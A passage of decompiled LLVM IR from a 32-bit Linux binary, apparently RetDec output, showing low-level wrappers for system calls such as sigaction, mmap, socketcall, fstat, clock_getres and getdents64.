  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_804f5bc.104 to i32), i32 -134542780), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_804c94c, i32* bitcast (i32** @global_var_804f650.114 to i32*), align 16
  store i32 %arg5, i32* @global_var_804f6c8.106, align 8
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_804f5bc.104 to i32), i32 -134542780), i32 2), i32 0), label %dec_label_pc_804c971, label %dec_label_pc_804c9a1.critedge

dec_label_pc_804c971:                             ; preds = %dec_label_pc_804c94c, %dec_label_pc_804c971
  %v4_804c971 = phi i32 [ %v1_804c978, %dec_label_pc_804c971 ], [ 0, %dec_label_pc_804c94c ]
  %v5_804c971 = mul i32 %v4_804c971, 4
  %v6_804c971 = add i32 %v5_804c971, ptrtoint (i32* @global_var_804f5bc.104 to i32)
  %v7_804c971 = inttoptr i32 %v6_804c971 to i32*
  %v8_804c971 = load i32, i32* %v7_804c971, align 4
  call void @__pseudo_call(i32 %v8_804c971)
  %v0_804c978 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c978 = add i32 %v0_804c978, 1
  store i32 %v1_804c978, i32* %ebx.global-to-local, align 4
  %v1_804c979 = load i32, i32* %esi.global-to-local, align 4
  %v7_804c979 = icmp ult i32 %v1_804c978, %v1_804c979
  br i1 %v7_804c979, label %dec_label_pc_804c971, label %dec_label_pc_804c97d

dec_label_pc_804c97d:                             ; preds = %dec_label_pc_804c971
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_804f5bc.104 to i32), i32 -134542780), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_804f5bc.104 to i32), i32 -134542780), i32 2), i32 0), label %dec_label_pc_804c995, label %dec_label_pc_804c9a1

dec_label_pc_804c995:                             ; preds = %dec_label_pc_804c97d, %dec_label_pc_804c995
  %v4_804c995 = phi i32 [ %v1_804c99c, %dec_label_pc_804c995 ], [ 0, %dec_label_pc_804c97d ]
  store i32 ptrtoint (i32* @global_var_804c99c.116 to i32), i32* %stack_var_-168, align 4
  %v5_804c995 = mul i32 %v4_804c995, 4
  %v6_804c995 = add i32 %v5_804c995, ptrtoint (i32* @global_var_804f5bc.104 to i32)
  %v7_804c995 = inttoptr i32 %v6_804c995 to i32*
  %v8_804c995 = load i32, i32* %v7_804c995, align 4
  call void @__pseudo_call(i32 %v8_804c995)
  %v0_804c99c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c99c = add i32 %v0_804c99c, 1
  store i32 %v1_804c99c, i32* %ebx.global-to-local, align 4
  %v1_804c99d = load i32, i32* %esi.global-to-local, align 4
  %v7_804c99d = icmp ult i32 %v1_804c99c, %v1_804c99d
  br i1 %v7_804c99d, label %dec_label_pc_804c995, label %dec_label_pc_804c9a1

dec_label_pc_804c9a1.critedge:                    ; preds = %dec_label_pc_804c94c
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_804f5bc.104 to i32), i32 -134542780), i32 2), i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c9a1

dec_label_pc_804c9a1:                             ; preds = %dec_label_pc_804c995, %dec_label_pc_804c9a1.critedge, %dec_label_pc_804c97d
  %v0_804c9aa = load i32, i32* %stack_var_-168, align 4
  %v1_804c9aa = call i32 @function_804b330(i32 %v0_804c9aa)
  %v1_804c9af = inttoptr i32 %v1_804c9aa to i32*
  store i32 0, i32* %v1_804c9af, align 4
  store i32 0, i32* @eax, align 4
  %v0_804c9d0 = load i32, i32* @edi, align 4
  store i32 %v0_804c9d0, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_804c9df = load i32, i32* @eax, align 4
  %v1_804c9e2 = call i32 @function_804c440(i32 %v0_804c9df)
  %v0_804c9ed = load i32, i32* @ebx, align 4
  %v1_804c9ed = inttoptr i32 %v0_804c9ed to %sigcontext*
  %v2_804c9ed = call i32 @sigreturn(%sigcontext* %v1_804c9ed)
  %v0_804c9f5 = load i32, i32* @ebx, align 4
  %v1_804c9f5 = inttoptr i32 %v0_804c9f5 to %sigcontext*
  %v2_804c9f5 = call i32 @sigreturn(%sigcontext* %v1_804c9f5)
  ret i32 %v2_804c9f5

; uselistorder directives
  uselistorder i32 %v1_804c99c, { 1, 2, 0 }
  uselistorder i32 %v1_804c978, { 1, 2, 0 }
  uselistorder i32 %v2_804c8b6, { 1, 0 }
  uselistorder i32 %v1_804c8b3, { 2, 1, 0 }
  uselistorder i32 %v1_804c892, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c88f, { 1, 0 }
  uselistorder i32 %v1_804c866, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 6, 5, 2 }
  uselistorder i32 (i32)* @function_804c440, { 0, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_804f5bc.104 to i32), i32 -134542780), i32 2), { 0, 4, 2, 5, 3, 1 }
  uselistorder i32 ()* @function_804c7b8, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c9a1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c995, { 1, 0 }
  uselistorder label %dec_label_pc_804c971, { 1, 0 }
  uselistorder label %dec_label_pc_804c94c, { 1, 0 }
  uselistorder label %dec_label_pc_804c8b3, { 1, 0 }
  uselistorder label %dec_label_pc_804c89b, { 1, 0 }
}

define i32 @function_804c9f7(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804c9f7:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804c9f7 = load i32, i32* @esi, align 4
  %v0_804c9f8 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804ca0d = icmp eq i32* %arg2, null
  br i1 %v1_804ca0d, label %dec_label_pc_804ca61, label %dec_label_pc_804ca11

dec_label_pc_804ca11:                             ; preds = %dec_label_pc_804c9f7
  %v2_804ca11 = load i32, i32* %arg2, align 4
  store i32 %v2_804ca11, i32* %stack_var_-148, align 4
  %v1_804ca1a = add i32 %tmp11, 4
  %v3_804ca2c = bitcast i32* %stack_var_-136 to i16*
  %v4_804ca2c = call i32 @function_804d032(i16* %v3_804ca2c, i32 %v1_804ca1a, i32 128)
  br label %dec_label_pc_804ca61

dec_label_pc_804ca61:                             ; preds = %dec_label_pc_804c9f7, %dec_label_pc_804ca11
  %v1_804ca63 = icmp eq i32 %arg3, 0
  br i1 %v1_804ca63, label %dec_label_pc_804ca6b, label %dec_label_pc_804ca67

dec_label_pc_804ca67:                             ; preds = %dec_label_pc_804ca61
  %v2_804ca67 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804ca6b

dec_label_pc_804ca6b:                             ; preds = %dec_label_pc_804ca61, %dec_label_pc_804ca67
  %v0_804ca7a = phi i32 [ 0, %dec_label_pc_804ca61 ], [ %v2_804ca67, %dec_label_pc_804ca67 ]
  br i1 %v1_804ca0d, label %dec_label_pc_804ca78, label %dec_label_pc_804ca71

dec_label_pc_804ca71:                             ; preds = %dec_label_pc_804ca6b
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804ca78

dec_label_pc_804ca78:                             ; preds = %dec_label_pc_804ca6b, %dec_label_pc_804ca71
  %v0_804ca7b = phi %sigaction* [ null, %dec_label_pc_804ca6b ], [ %phitmp, %dec_label_pc_804ca71 ]
  %v5_804ca83 = call i32 @function_804cb21(i32 %arg1, %sigaction* %v0_804ca7b, i32 %v0_804ca7a, i32 8)
  store i32 %v5_804ca83, i32* %ebx.global-to-local, align 4
  br i1 %v1_804ca63, label %dec_label_pc_804cac6, label %dec_label_pc_804ca91

dec_label_pc_804ca91:                             ; preds = %dec_label_pc_804ca78
  %v2_804ca91 = icmp slt i32 %v5_804ca83, 0
  br i1 %v2_804ca91, label %dec_label_pc_804cac6, label %dec_label_pc_804ca95

dec_label_pc_804ca95:                             ; preds = %dec_label_pc_804ca91
  %v3_804ca95 = load i32, i32* %stack_var_-288, align 4
  %v2_804ca99 = inttoptr i32 %arg3 to i32*
  store i32 %v3_804ca95, i32* %v2_804ca99, align 4
  %v2_804caa1 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804caa6 = add i32 %arg3, 4
  %v3_804caaa = inttoptr i32 %v1_804caa6 to i16*
  %v4_804caaa = call i32 @function_804d032(i16* %v3_804caaa, i32 %v2_804caa1, i32 128)
  %v2_804cab3 = add i32 %arg3, 132
  %v3_804cab3 = inttoptr i32 %v2_804cab3 to i32*
  %v2_804cac0 = add i32 %arg3, 136
  %v3_804cac0 = inttoptr i32 %v2_804cac0 to i32*
  %v0_804cacc.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cac6

dec_label_pc_804cac6:                             ; preds = %dec_label_pc_804ca91, %dec_label_pc_804ca78, %dec_label_pc_804ca95
  %v0_804cacc = phi i32 [ %v5_804ca83, %dec_label_pc_804ca91 ], [ %v5_804ca83, %dec_label_pc_804ca78 ], [ %v0_804cacc.pre, %dec_label_pc_804ca95 ]
  store i32 %v0_804c9f8, i32* @ebx, align 4
  store i32 %v0_804c9f7, i32* @esi, align 4
  ret i32 %v0_804cacc

; uselistorder directives
  uselistorder i32 %arg3, { 0, 4, 1, 2, 3, 5 }
  uselistorder label %dec_label_pc_804cac6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ca78, { 1, 0 }
  uselistorder label %dec_label_pc_804ca6b, { 1, 0 }
  uselistorder label %dec_label_pc_804ca61, { 1, 0 }
}

define i32 @function_804cad4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804cad4:
  %stack_var_4 = alloca i32, align 4
  %v0_804cad4 = load i32, i32* @ebx, align 4
  store i32 %v0_804cad4, i32* @edx, align 4
  %v2_804cadf = load i32, i32* @ecx, align 4
  %v4_804cadf = load i32, i32* @esi, align 4
  %v5_804cadf = load i32, i32* @edi, align 4
  %v6_804cadf = load i32, i32* @ebp, align 4
  %v7_804cadf = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_804cadf, i32 %v0_804cad4, i32 %v4_804cadf, i32 %v5_804cadf, i32 %v6_804cadf)
  %v8_804cadf = ptrtoint i32* %v7_804cadf to i32
  store i32 %v0_804cad4, i32* @ebx, align 4
  %v3_804cae8 = icmp ugt i32* %v7_804cadf, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_804cae8, i32 134533305)
  ret i32 %v8_804cadf

; uselistorder directives
  uselistorder i32* @ebp, { 3, 83, 84, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 79, 75, 76, 77, 78, 1, 80, 11, 12, 13, 14, 15, 16, 22, 23, 17, 18, 19, 20, 21, 4, 5, 6, 9, 49, 50, 7, 8, 10, 51, 48, 24, 0, 25, 26, 27, 28, 29, 30, 31, 32, 2, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 81, 82 }
}

define i32 @function_804caef(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804caef:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804caef = load i32, i32* @ebx, align 4
  store i32 %v0_804caef, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804cb02 = call i32 @int80_syscall(i32 102)
  store i32 %v1_804cb02, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_804cb02, -4095
  br i1 %tmp9, label %dec_label_pc_804cb1b, label %dec_label_pc_804cb0f

dec_label_pc_804cb0f:                             ; preds = %dec_label_pc_804caef
  %v1_804cb0f = call i32 @function_804b330(i32 %v0_804caef)
  %v0_804cb14 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cb14 = sub i32 0, %v0_804cb14
  %v2_804cb16 = inttoptr i32 %v1_804cb0f to i32*
  store i32 %v1_804cb14, i32* %v2_804cb16, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804cb1f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cb1b

dec_label_pc_804cb1b:                             ; preds = %dec_label_pc_804caef, %dec_label_pc_804cb0f
  %v2_804cb1f = phi i32 [ %v0_804caef, %dec_label_pc_804caef ], [ %v2_804cb1f.pre, %dec_label_pc_804cb0f ]
  %v0_804cb1c = phi i32 [ %v1_804cb02, %dec_label_pc_804caef ], [ -1, %dec_label_pc_804cb0f ]
  %v2_804cb1b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804cb1b, i32* @edx, align 4
  store i32 %v2_804cb1f, i32* @ebx, align 4
  ret i32 %v0_804cb1c

; uselistorder directives
  uselistorder i32 %v1_804cb02, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cb1b, { 1, 0 }
}

define i32 @function_804cb21(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804cb21:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804cb22 = load i32, i32* @esi, align 4
  store i32 %v0_804cb22, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804cb36 = load i32, i32* @ebx, align 4
  %v7_804cb3e = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804cb3e, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_804cb3e, -4095
  br i1 %tmp14, label %dec_label_pc_804cb56, label %dec_label_pc_804cb4a

dec_label_pc_804cb4a:                             ; preds = %dec_label_pc_804cb21
  %v1_804cb4a = call i32 @function_804b330(i32 %v0_804cb36)
  %v0_804cb4f = load i32, i32* %esi.global-to-local, align 4
  %v1_804cb4f = sub i32 0, %v0_804cb4f
  %v2_804cb51 = inttoptr i32 %v1_804cb4a to i32*
  store i32 %v1_804cb4f, i32* %v2_804cb51, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804cb59.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804cb56

dec_label_pc_804cb56:                             ; preds = %dec_label_pc_804cb21, %dec_label_pc_804cb4a
  %v2_804cb59 = phi i32 [ %v0_804cb22, %dec_label_pc_804cb21 ], [ %v2_804cb59.pre, %dec_label_pc_804cb4a ]
  %v0_804cb57 = phi i32 [ %v7_804cb3e, %dec_label_pc_804cb21 ], [ -1, %dec_label_pc_804cb4a ]
  store i32 %v2_804cb59, i32* @esi, align 4
  ret i32 %v0_804cb57

; uselistorder directives
  uselistorder i32 %v7_804cb3e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cb56, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_804cb5c(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_804cb5c:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_804cb84(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804cb84:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cb84 = load i32, i32* @ebx, align 4
  store i32 %v0_804cb84, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804cb97 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804cb97, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_804cb97, -4095
  br i1 %tmp10, label %dec_label_pc_804cbb0, label %dec_label_pc_804cba4

dec_label_pc_804cba4:                             ; preds = %dec_label_pc_804cb84
  %v1_804cba4 = call i32 @function_804b330(i32 %v0_804cb84)
  %v0_804cba9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cba9 = sub i32 0, %v0_804cba9
  %v2_804cbab = inttoptr i32 %v1_804cba4 to i32*
  store i32 %v1_804cba9, i32* %v2_804cbab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804cbb4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cbb0

dec_label_pc_804cbb0:                             ; preds = %dec_label_pc_804cb84, %dec_label_pc_804cba4
  %v2_804cbb4 = phi i32 [ %v0_804cb84, %dec_label_pc_804cb84 ], [ %v2_804cbb4.pre, %dec_label_pc_804cba4 ]
  %v0_804cbb1 = phi i32 [ %v4_804cb97, %dec_label_pc_804cb84 ], [ -1, %dec_label_pc_804cba4 ]
  %v2_804cbb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804cbb0, i32* @edx, align 4
  store i32 %v2_804cbb4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804cbb1

; uselistorder directives
  uselistorder i32 %v4_804cb97, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804cbb0, { 1, 0 }
}

define i32 @function_804cbb6(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804cbb6:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cbb6 = load i32, i32* @ebx, align 4
  store i32 %v0_804cbb6, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_804cbc9 = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_804cbc9, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_804cbc9, -4095
  br i1 %tmp13, label %dec_label_pc_804cbe4, label %dec_label_pc_804cbd6

dec_label_pc_804cbd6:                             ; preds = %dec_label_pc_804cbb6
  %v1_804cbd6 = call i32 @function_804b330(i32 %v0_804cbb6)
  %v0_804cbdb = load i32, i32* @ebx, align 4
  %v1_804cbdb = sub i32 0, %v0_804cbdb
  %v2_804cbdd = inttoptr i32 %v1_804cbd6 to i32*
  store i32 %v1_804cbdb, i32* %v2_804cbdd, align 4
  %v2_804cbfc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cbf7

dec_label_pc_804cbe4:                             ; preds = %dec_label_pc_804cbb6
  %v1_804cbe4 = icmp eq i32 %v4_804cbc9, 0
  %v1_804cbe6 = icmp eq i1 %v1_804cbe4, false
  br i1 %v1_804cbe6, label %dec_label_pc_804cbf7, label %dec_label_pc_804cbe8

dec_label_pc_804cbe8:                             ; preds = %dec_label_pc_804cbe4
  %v4_804cbef = bitcast i32* %stack_var_-68 to i16*
  %v5_804cbef = call i32 @function_804cfb5(i16* %v4_804cbef, i32 %arg2, i32 %v4_804cbc9, i32 %v4_804cbc9)
  %v0_804cbfa.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cbf7

dec_label_pc_804cbf7:                             ; preds = %dec_label_pc_804cbe4, %dec_label_pc_804cbd6, %dec_label_pc_804cbe8
  %v2_804cbfc = phi i32 [ %v0_804cbb6, %dec_label_pc_804cbe4 ], [ %v2_804cbfc.pre, %dec_label_pc_804cbd6 ], [ %v0_804cbb6, %dec_label_pc_804cbe8 ]
  %v0_804cbfa = phi i32 [ %v4_804cbc9, %dec_label_pc_804cbe4 ], [ -1, %dec_label_pc_804cbd6 ], [ %v0_804cbfa.pre, %dec_label_pc_804cbe8 ]
  store i32 %v2_804cbfc, i32* @ebx, align 4
  ret i32 %v0_804cbfa

; uselistorder directives
  uselistorder i32 %v4_804cbc9, { 1, 2, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804cbf7, { 2, 0, 1 }
}

define i32 @function_804cbfe(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804cbfe:
  %eax.global-to-local = alloca i32, align 4
  %v0_804cbfe = load i32, i32* @edi, align 4
  %v0_804cbff = load i32, i32* @esi, align 4
  %v0_804cc00 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_804cc05 = load i32, i32* @edx, align 4
  %v7_804cc0f = inttoptr i32 %arg2 to i32*
  %v8_804cc0f = call i32 @function_804cc6d(i32 %arg1, i32* %v7_804cc0f, i32 %arg3, i32 %v0_804cc05, i32 %v0_804cc00, i32 %v0_804cbff, i32 %v0_804cbfe)
  store i32 %v8_804cc0f, i32* %eax.global-to-local, align 4
  store i32 %v8_804cc0f, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_804cc0f, 1
  br i1 %tmp24, label %dec_label_pc_804cc67, label %dec_label_pc_804cc1d

dec_label_pc_804cc1d:                             ; preds = %dec_label_pc_804cbfe
  %v0_804cc1d = load i32, i32* @ebx, align 4
  %v2_804cc1d = add i32 %v0_804cc1d, %v8_804cc0f
  store i32 %v2_804cc1d, i32* @edi, align 4
  %v7_804cc634 = icmp ult i32 %v0_804cc1d, %v2_804cc1d
  br i1 %v7_804cc634, label %dec_label_pc_804cc22, label %dec_label_pc_804cc67

dec_label_pc_804cc22:                             ; preds = %dec_label_pc_804cc1d, %dec_label_pc_804cc22
  %v0_804cc22 = phi i32 [ %v2_804cc61, %dec_label_pc_804cc22 ], [ %v0_804cc1d, %dec_label_pc_804cc1d ]
  %v1_804cc22 = add i32 %v0_804cc22, 8
  %v2_804cc22 = inttoptr i32 %v1_804cc22 to i32*
  %v3_804cc22 = load i32, i32* %v2_804cc22, align 4
  store i32 %v3_804cc22, i32* %eax.global-to-local, align 4
  %v2_804cc25 = add i32 %v0_804cc22, 4
  %v3_804cc25 = inttoptr i32 %v2_804cc25 to i32*
  store i32 %v3_804cc22, i32* %v3_804cc25, align 4
  %v0_804cc28 = load i32, i32* @ebx, align 4
  %v1_804cc28 = add i32 %v0_804cc28, 16
  %v2_804cc28 = inttoptr i32 %v1_804cc28 to i32*
  %v3_804cc28 = load i32, i32* %v2_804cc28, align 4
  store i32 %v3_804cc28, i32* %eax.global-to-local, align 4
  %v1_804cc2b = trunc i32 %v3_804cc28 to i16
  %v3_804cc2b = add i32 %v0_804cc28, 8
  %v4_804cc2b = inttoptr i32 %v3_804cc2b to i16*
  store i16 %v1_804cc2b, i16* %v4_804cc2b, align 2
  %v0_804cc2f = load i32, i32* @ebx, align 4
  %v1_804cc2f = add i32 %v0_804cc2f, 18
  %v2_804cc2f = inttoptr i32 %v1_804cc2f to i8*
  %v3_804cc2f = load i8, i8* %v2_804cc2f, align 1
  %v4_804cc2f = zext i8 %v3_804cc2f to i32
  %v5_804cc2f = load i32, i32* %eax.global-to-local, align 4
  %v6_804cc2f = and i32 %v5_804cc2f, -256
  %v7_804cc2f = or i32 %v6_804cc2f, %v4_804cc2f
  store i32 %v7_804cc2f, i32* %eax.global-to-local, align 4
  %v3_804cc32 = add i32 %v0_804cc2f, 10
  %v4_804cc32 = inttoptr i32 %v3_804cc32 to i8*
  store i8 %v3_804cc2f, i8* %v4_804cc32, align 1
  %v0_804cc36 = load i32, i32* @ebx, align 4
  %v1_804cc36 = add i32 %v0_804cc36, 8
  %v2_804cc36 = inttoptr i32 %v1_804cc36 to i16*
  %v3_804cc36 = load i16, i16* %v2_804cc36, align 2
  %v4_804cc36 = zext i16 %v3_804cc36 to i32
  %v1_804cc3a = add nsw i32 %v4_804cc36, -19
  %v1_804cc3e = add i32 %v0_804cc36, 19
  %v1_804cc42 = add i32 %v0_804cc36, 11
  store i32 %v1_804cc42, i32* %eax.global-to-local, align 4
  %v3_804cc46 = inttoptr i32 %v1_804cc42 to i8*
  %v4_804cc46 = call i32 @function_804b35a(i8* %v3_804cc46, i32 %v1_804cc3e, i32 %v1_804cc3a)
  store i32 %v4_804cc46, i32* %eax.global-to-local, align 4
  %v0_804cc4b = load i32, i32* @ebx, align 4
  %v1_804cc4b = add i32 %v0_804cc4b, 8
  %v2_804cc4b = inttoptr i32 %v1_804cc4b to i16*
  %v3_804cc4b = load i16, i16* %v2_804cc4b, align 2
  %v4_804cc4b = zext i16 %v3_804cc4b to i32
  store i32 %v4_804cc4b, i32* %eax.global-to-local, align 4
  %v3_804cc55 = inttoptr i32 %v0_804cc4b to i8*
  %v4_804cc55 = call i32 @function_804b35a(i8* %v3_804cc55, i32 %v0_804cc4b, i32 %v4_804cc4b)
  store i32 %v4_804cc55, i32* %eax.global-to-local, align 4
  %v0_804cc5a = load i32, i32* @ebx, align 4
  %v1_804cc5a = add i32 %v0_804cc5a, 8
  %v2_804cc5a = inttoptr i32 %v1_804cc5a to i16*
  %v3_804cc5a = load i16, i16* %v2_804cc5a, align 2
  %v4_804cc5a = zext i16 %v3_804cc5a to i32
  store i32 %v4_804cc5a, i32* %eax.global-to-local, align 4
  %v2_804cc61 = add i32 %v4_804cc5a, %v0_804cc5a
  store i32 %v2_804cc61, i32* @ebx, align 4
  %v1_804cc63 = load i32, i32* @edi, align 4
  %v7_804cc63 = icmp ult i32 %v2_804cc61, %v1_804cc63
  br i1 %v7_804cc63, label %dec_label_pc_804cc22, label %dec_label_pc_804cc63.dec_label_pc_804cc67.loopexit_crit_edge

dec_label_pc_804cc63.dec_label_pc_804cc67.loopexit_crit_edge: ; preds = %dec_label_pc_804cc22
  %v0_804cc68.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cc67

dec_label_pc_804cc67:                             ; preds = %dec_label_pc_804cc1d, %dec_label_pc_804cc63.dec_label_pc_804cc67.loopexit_crit_edge, %dec_label_pc_804cbfe
  %v0_804cc68 = phi i32 [ %v8_804cc0f, %dec_label_pc_804cbfe ], [ %v0_804cc68.pre.pre, %dec_label_pc_804cc63.dec_label_pc_804cc67.loopexit_crit_edge ], [ %v8_804cc0f, %dec_label_pc_804cc1d ]
  store i32 %v0_804cc68, i32* %eax.global-to-local, align 4
  store i32 %v0_804cbff, i32* @esi, align 4
  store i32 %v0_804cbfe, i32* @edi, align 4
  ret i32 %v0_804cc68

; uselistorder directives
  uselistorder i32 %v0_804cc68, { 1, 0 }
  uselistorder i32 %v2_804cc61, { 1, 2, 0 }
  uselistorder i32 %v0_804cc4b, { 1, 0, 2 }
  uselistorder i32 %v0_804cc36, { 1, 0, 2 }
  uselistorder i32 %v0_804cc22, { 1, 0 }
  uselistorder i32 %v0_804cc1d, { 0, 2, 1 }
  uselistorder i32 %v8_804cc0f, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_804b35a, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 11, { 4, 1, 7, 3, 2, 5, 6, 0 }
  uselistorder label %dec_label_pc_804cc67, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cc22, { 1, 0 }
}

define i32 @function_804cc6d(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_804cc6d:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_804cc70 = load i32, i32* @edi, align 4
  %v0_804cc72 = load i32, i32* @ebx, align 4
  %v15_804cc73 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_804cc7f = add i32 %arg3, 30
  %v1_804cc82 = and i32 %v1_804cc7f, -16
  %v2_804cc85 = sub i32 %v15_804cc73, %v1_804cc82
  %v1_804cc87 = add i32 %v2_804cc85, 15
  %v1_804cc8b = and i32 %v1_804cc87, -16
  %v1_804cc91 = inttoptr i32 %v1_804cc8b to %linux_dirent64*
  store i32 %v1_804cc8b, i32* @ecx, align 4
  %v2_804cc93 = add i32 %v2_804cc85, -4
  %v3_804cc93 = inttoptr i32 %v2_804cc93 to i32*
  store i32 %v0_804cc72, i32* %v3_804cc93, align 4
  %v0_804cc94 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_804cc9b = call i32 @getdents64(i32 %v0_804cc94, %linux_dirent64* %v1_804cc91, i32 %arg3)
  store i32 %v5_804cc9b, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v5_804cc9b, -4095
  br i1 %tmp42, label %dec_label_pc_804ccb7, label %dec_label_pc_804cca8

dec_label_pc_804cca8:                             ; preds = %dec_label_pc_804cc6d
  %v1_804cca8 = call i32 @function_804b330(i32 %v5_804cc9b)
  store i32 %v1_804cca8, i32* %eax.global-to-local, align 4
  %v4_804ccad = sub i32 0, %v5_804cc9b
  store i32 %v4_804ccad, i32* @edx, align 4
